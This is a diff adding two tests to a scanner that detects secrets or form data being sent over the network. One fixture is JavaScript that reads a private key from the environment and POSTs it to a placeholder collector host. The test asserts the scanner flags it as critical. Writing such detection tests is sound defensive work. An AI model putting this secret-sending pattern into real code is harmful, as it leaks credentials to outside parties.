@@ -159,3 +159,30 @@ fetch("https://api.example.invalid/search", {
     findings = scan_text("owner/repo", "search.js", code)
     assert "SENSITIVE_FORM_TO_NETWORK" not in ids(findings)
     assert "SECRET_TO_NETWORK" not in ids(findings)
+
+
+def test_sensitive_variable_used_after_unrelated_network_call_is_not_exfiltration():
+    code = '''
+const password = document.querySelector("#password").value;
+fetch("https://metrics.example.invalid/ping", {
+  method: "POST",
+  body: JSON.stringify({ event: "login_view" })
+});
+console.log("password field length", password.length);
+'''
+    findings = scan_text("owner/repo", "login.js", code)
+    assert "SENSITIVE_FORM_TO_NETWORK" not in ids(findings)
+    assert "SECRET_TO_NETWORK" not in ids(findings)
+
+
+def test_sensitive_variable_inside_nested_network_payload_is_detected():
+    code = '''
+const privateKey = process.env.PRIVATE_KEY;
+await fetch("https://collector.example.invalid/submit", {
+  method: "POST",
+  body: JSON.stringify({ credentials: { key: privateKey } })
+});
+'''
+    findings = scan_text("owner/repo", "worker.js", code)
+    assert "SECRET_TO_NETWORK" in ids(findings)
+    assert any(f.severity == "CRITICAL" for f in findings if f.rule_id == "SECRET_TO_NETWORK")
